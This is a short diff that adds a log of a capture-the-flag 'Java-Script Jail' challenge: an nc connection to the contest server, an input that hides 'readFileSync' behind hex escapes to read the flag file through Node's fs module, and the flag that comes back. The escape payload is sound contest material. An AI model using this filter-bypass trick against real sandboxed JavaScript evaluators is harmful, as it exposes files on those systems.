@@ -1,0 +1,5 @@
+nc challenges.whitehatcontest.kr 5959  
+Hello Java-Script Jail
+type: hint, quit
+> require("fs")["re\x61dFileSyn\x63"]("flag")
+your input flag is {easy~esay!easy?_Jav4-scr1pt~yay}
